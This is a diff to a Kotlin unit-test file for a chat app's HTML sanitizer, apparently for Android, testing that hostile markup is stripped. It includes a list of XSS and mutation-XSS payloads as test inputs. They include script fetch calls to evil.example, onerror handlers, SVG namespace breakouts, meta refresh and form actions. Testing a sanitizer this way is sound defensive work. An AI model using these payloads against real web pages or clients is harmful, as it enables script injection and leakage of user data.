@@ -2,6 +2,8 @@ package dev.ipf.whitenoise.android.ui.conversation.media
 
 import kotlinx.coroutines.runBlocking
 import org.jsoup.Jsoup
+import org.jsoup.nodes.Document
+import org.jsoup.nodes.Entities
 import org.junit.Assert.assertEquals
 import org.junit.Assert.assertFalse
 import org.junit.Assert.assertNotNull
@@ -10,46 +12,160 @@ import org.junit.Assert.assertTrue
 import org.junit.Test
 
 class LocalHtmlPolicyTest {
-    @Test fun hostileContentHasNoSenderResourcesOrAttributes() =
-        runBlocking {
-            val vectors =
-                listOf(
-                    "<base href=https://evil.example/><a href=relative>relative</a>",
-                    "<img src=x srcset='https://evil.example 2x'><video poster=x><source src=x></video>",
-                    (
-                        "<table background=https://evil.example><tr><td " +
-                            "style='background:url(https://evil.example)' colspan=2>text</td></tr></table>"
-                    ),
-                    "<math><mtext><table><mglyph><style><img src=https://evil.example>",
-                    "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\"></noscript>",
-                    "<svg><a href=https://evil.example>svg</a></svg><select><option>option</option></select>",
-                    "<iframe srcdoc='<img src=x>'></iframe><object data=x></object><embed src=x>",
-                    (
-                        "<meta http-equiv=refresh content='0;url=https://evil.example'><link " +
-                            "rel=prefetch href=https://evil.example>"
-                    ),
-                    (
-                        "<style>@import 'https://evil.example';p{background:url(x)}</style><script>" +
-                            "fetch('https://evil.example')</script>"
-                    ),
-                    "<form action=https://evil.example method=post><input name=x><button>send</button></form>",
-                    "<p>&lt;script&gt; &amp; <custom-el onclick=x>kept text</custom-el></p>",
-                    "<a href='https://ok.example/\"><img src=https://evil.example>' ping=x target=_blank>quote</a>",
-                )
-            for (source in vectors) {
-                val result = LocalHtmlPolicy.sanitize(source)
-                val body = Jsoup.parse(result.html).body()
-                assertTrue(
-                    source,
-                    body.select("script,style,img,svg,math,iframe,object,embed,meta,link,input,form").isEmpty(),
-                )
-                for (element in body.allElements) {
-                    for (attr in element.attributes()) {
-                        assertTrue(source, attr.key in setOf("href", "colspan", "rowspan"))
-                        if (attr.key == "href") assertNotNull(result.destination(attr.value))
-                    }
+    private val hostile =
+        listOf(
+            "<base href=https://evil.example/><a href=relative>relative</a>",
+            "<img src=x srcset='https://evil.example 2x'><video poster=x><source src=x></video>",
+            (
+                "<table background=https://evil.example><tr><td " +
+                    "style='background:url(https://evil.example)' colspan=2>text</td></tr></table>"
+            ),
+            "<math><mtext><table><mglyph><style><img src=https://evil.example>",
+            "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\"></noscript>",
+            "<svg><a href=https://evil.example>svg</a></svg><select><option>option</option></select>",
+            "<iframe srcdoc='<img src=x>'></iframe><object data=x></object><embed src=x>",
+            (
+                "<meta http-equiv=refresh content='0;url=https://evil.example'><link " +
+                    "rel=prefetch href=https://evil.example>"
+            ),
+            "<style>@import 'https://evil.example';p{color:red}</style><script>fetch('https://evil.example')</script>",
+            "<form action=https://evil.example method=post><input name=x><button>send</button></form>",
+            "<p>&lt;script&gt; &amp; <custom-el onclick=x>kept text</custom-el></p>",
+            "<a href='https://ok.example/\"><img src=https://evil.example>' ping=x target=_blank>quote</a>",
+            "<svg><title><img src=x onerror=alert(1)></title><desc><svg><foreignObject><img src=x>",
+            "<svg><style>&lt;/style&gt;&lt;img src=x onerror=alert(1)&gt;</style></svg>",
+            "<svg><style><![CDATA[</style><img src=x onerror=alert(1)>]]></style></svg>",
+            "<svg><style><g></g>p{}</style></svg><p style=\"x</style><img src=x>\">p</p>",
+            "<svg><foreignObject><div onclick=x>inside</div></foreignObject><b>breakout</b></svg>",
+            (
+                "<svg onload=alert(1)><use href=#a xlink:href=https://evil.example/x.svg#a /><image href=x />" +
+                    "<animate attributeName=href to=javascript:x /><set attributeName=fill to=red /></svg>"
+            ),
+            (
+                "<svg><rect fill='url(https://evil.example/x)' stroke='URL( \"https://evil.example\" )' " +
+                    "filter='url(#a)' clip-path='url(#a) url(https://evil.example)' mask=url(#a) /></svg>"
+            ),
+            "<svg><text>t<a href=https://evil.example>link</a><tspan>s</tspan><rect /></text></svg>",
+            "<svg><rect fill='&#117;rl(https://evil.example)' stroke='\\75 rl(x)' /></svg>",
+            "<div onclick=x onmouseover=y style='color:red'>events</div><body onload=x background=y>",
+            "<template><style>p{}</style><img src=x></template><xmp><img src=x></xmp>",
+        )
+
+    private val allowedTags =
+        (
+            "html head body meta style a abbr article aside b blockquote br caption cite code col colgroup dd " +
+                "del details div dl dt em figcaption figure footer h1 h2 h3 h4 h5 h6 header hr i ins kbd li main " +
+                "mark nav ol p pre q s samp section small span strong sub summary sup table tbody td tfoot th " +
+                "thead time tr u ul wbr svg g path rect circle ellipse line polyline polygon text tspan defs stop " +
+                "desc title marker lineargradient radialgradient clippath"
+        ).split(' ').toSet()
+    private val forbiddenAttribute = Regex("(?i)on.*|.*:.*|src|srcset|srcdoc|background|action|poster|data|ping")
+
+    private fun bodyInvariants(
+        source: String,
+        result: LocalHtmlDocument,
+    ) {
+        val output = Jsoup.parse(result.html)
+        for (element in output.body().allElements) {
+            assertTrue("$source -> ${element.normalName()}", element.normalName() in allowedTags - "meta" - "style")
+            for (attr in element.attributes()) {
+                assertFalse("$source -> ${attr.key}", forbiddenAttribute.matches(attr.key))
+                if (attr.key == "href") assertNotNull(source, result.destination(attr.value))
+                if (attr.key != "style") {
+                    assertFalse(source, attr.value.contains("url(", true) && !attr.value.contains("url(#", true))
                 }
             }
+        }
+        val styles = output.head().select("style")
+        assertTrue(source, styles.size in 1..2)
+        for (style in styles) assertFalse(source, '<' in style.data())
+    }
+
+    @Test fun hostileContentHasNoSenderResourcesOrActiveMarkup() =
+        runBlocking {
+            for (source in hostile) {
+                val result = LocalHtmlPolicy.sanitize(source)
+                assertTrue(source, result.omitted)
+                bodyInvariants(source, result)
+                // Inline style url() survives by design; the CSP and blocked network loads contain it.
+                val body = Jsoup.parse(result.html).body()
+                body.select("[style]").removeAttr("style")
+                assertFalse(source, "evil.example" in body.html())
+            }
+        }
+
+    /** A second pass over the output keeps everything: the browser's reparse cannot move markup elsewhere. */
+    @Test fun outputIsAStableReparse() =
+        runBlocking {
+            val unwrappedNesting =
+                listOf(
+                    "<a href=https://a.example/><marquee><a href=https://b.example/>x</a></marquee>tail</a>",
+                    "<p><marquee><p>inner</p></marquee>after</p>",
+                    "<h1><font><h1>inner</h1></font>after</h1>",
+                    "<ul><li><center><li>inner</li></center>after</li></ul>",
+                )
+            for (source in hostile + unwrappedNesting + agentOverview) {
+                val html = LocalHtmlPolicy.sanitize(source).html
+                val reparsed = Jsoup.parse(html)
+                reparsed.outputSettings().prettyPrint(false).escapeMode(Entities.EscapeMode.base)
+                assertEquals(source, html, reparsed.html())
+                val first = Jsoup.parse(html)
+                first.select("a[href]").removeAttr("href")
+                val second = LocalHtmlPolicy.sanitize(first.html())
+                assertFalse(source, second.omitted)
+                assertEquals(source, first.body().html(), Jsoup.parse(second.html).body().html())
+            }
+        }
+
+    @Test fun senderStylesheetFollowsPolicyInOneHeadBlock() =
+        runBlocking {
+            val doc =
+                LocalHtmlPolicy.sanitize(
+                    "<head><style>.a{color:red}</style></head><body><svg><style>.b{fill:red}</style></svg></body>",
+                )
+            val output: Document = Jsoup.parse(doc.html)
+            assertFalse(doc.omitted)
+            val head = output.head().children().map { it.normalName() }
+            val policy = output.head().selectFirst("meta[http-equiv=Content-Security-Policy]")!!
+            assertTrue("default-src 'none'" in policy.attr("content"))
+            assertEquals(listOf("style", "style"), head.filter { it == "style" })
+            assertTrue(head.indexOf("meta") < head.lastIndexOf("style"))
+            assertEquals(
+                ".a{color:red}\n.b{fill:red}\n",
+                output
+                    .head()
+                    .select("style")
+                    .last()!!
+                    .data(),
+            )
+            assertTrue(output.body().select("style").isEmpty())
+        }
+
+    @Test fun agentOverviewKeepsLayoutStylingAndCharts() =
+        runBlocking {
+            val doc = LocalHtmlPolicy.sanitize(agentOverview)
+            assertFalse(doc.omitted)
+            val output = Jsoup.parse(doc.html)
+            assertTrue(
+                ".card{border:1px solid #333}" in
+                    output
+                        .head()
+                        .select("style")
+                        .last()!!
+                        .data(),
+            )
+            assertEquals("en", output.selectFirst("html")!!.attr("lang"))
+            assertEquals("page", output.body().className())
+            assertEquals("padding:8px", output.selectFirst("section.card")!!.attr("style"))
+            assertEquals("2", output.selectFirst("th")!!.attr("colspan"))
+            assertTrue(output.selectFirst("details")!!.hasAttr("open"))
+            // jsoup prints SVG names lowercase; the HTML parser restores their SVG spelling on load.
+            assertEquals("0 0 100 50", output.selectFirst("svg")!!.attributes().get("viewBox"))
+            assertEquals("linearGradient", output.selectFirst("[id=g]")!!.tagName())
+            assertTrue("stop-color=\"#f00\"" in doc.html)
+            assertEquals("url(#g)", output.selectFirst("rect")!!.attr("fill"))
+            assertEquals("Q1 a", output.selectFirst("svg text")!!.text())
+            assertEquals("Revenue", output.selectFirst("svg title")!!.text())
         }
 
     @Test fun rawLinksIgnoreBaseAndOnlyAllowLiteralHttpSchemes() =
@@ -87,14 +203,14 @@ class LocalHtmlPolicyTest {
     /** Links the chat link confirmation would refuse, such as hidden userinfo or bidi overrides, stay inert text. */
     @Test fun deceptiveHttpLinksGetNoDestination() =
         runBlocking {
-            for (href in listOf("https://bank.example@evil.example/", "https://bank.example\u202Eelpmaxe.live")) {
+            for (href in listOf("https://bank.example@evil.example/", "https://bank.example‮elpmaxe.live")) {
                 val doc = LocalHtmlPolicy.sanitize("<a href=\"$href\">bank</a>")
                 assertTrue(doc.links.isEmpty())
                 assertFalse("wn-document-link" in doc.html)
             }
         }
 
-    @Test fun extremeDepthAndStructureAreBounded() =
+    @Test fun extremeDepthSizeAndStructureAreBounded() =
         runBlocking {
             val deep = "<div>".repeat(1000) + "text" + "</div>".repeat(1000)
             val result = runCatching { LocalHtmlPolicy.sanitize(deep) }
@@ -104,6 +220,11 @@ class LocalHtmlPolicyTest {
                 }
             }
             assertTrue(runCatching { LocalHtmlPolicy.sanitize("<p>x</p>".repeat(21000)) }.isFailure)
+            val longStyle = LocalHtmlPolicy.sanitize("<p style='${"x".repeat(17 * 1024)}'>p</p>")
+            assertTrue(longStyle.omitted)
+            assertFalse(Jsoup.parse(longStyle.html).selectFirst("p")!!.hasAttr("style"))
+            val css = "p{}".repeat(90 * 1024)
+            assertTrue(LocalHtmlPolicy.sanitize("<style>$css</style>").omitted)
         }
 
     @Test fun formattingTextAndBoundedTableSpansSurvive() =
@@ -126,14 +247,30 @@ class LocalHtmlPolicyTest {
         runBlocking {
             assertFalse(LocalHtmlPolicy.sanitize("<p>Notes</p>").omitted)
             for (source in listOf(
-                "<body style='color:red'><p>Notes</p></body>",
-                "<html style='background:black'><body><p>Notes</p></body></html>",
+                "<body onload='alert(1)' background=https://evil.example><p>Notes</p></body>",
+                "<html manifest=https://evil.example><body><p>Notes</p></body></html>",
+                "<html class=wide style='background:red'><body><p>Notes</p></body></html>",
             )) {
                 val doc = LocalHtmlPolicy.sanitize(source)
                 assertTrue(source, doc.omitted)
                 val output = Jsoup.parse(doc.html)
                 assertEquals(source, 0, output.body().attributesSize())
-                assertFalse(source, output.selectFirst("html")!!.hasAttr("style"))
+                assertEquals(source, 0, output.selectFirst("html")!!.attributesSize())
             }
         }
+
+    private companion object {
+        val agentOverview =
+            "<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport " +
+                "content='width=device-width'><title>Overview</title><style>.card{border:1px solid #333}" +
+                "</style></head><body class=page><header><h1>Sprint overview</h1></header>" +
+                "<section class=card style='padding:8px'><table><thead><tr><th colspan=2 scope=col>Status</th>" +
+                "</tr></thead><tbody><tr><td>Done</td><td><span class='pill ok'>12</span></td></tr></tbody>" +
+                "</table><details open><summary>More</summary><ol start=3><li>Item</li></ol></details>" +
+                "<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 50' width=100 role=img " +
+                "aria-label=Chart><title>Revenue</title><defs><linearGradient id=g x1=0 x2=1>" +
+                "<stop offset=0 stop-color=#f00 /></linearGradient></defs><rect width=10 height=20 " +
+                "fill='url(#g)' /><path d='M0 0 L10 10' stroke=#fff stroke-width=2 /><text x=1 y=10 " +
+                "text-anchor=start>Q1 <tspan dx=2>a</tspan></text></svg></section></body></html>"
+    }
 }
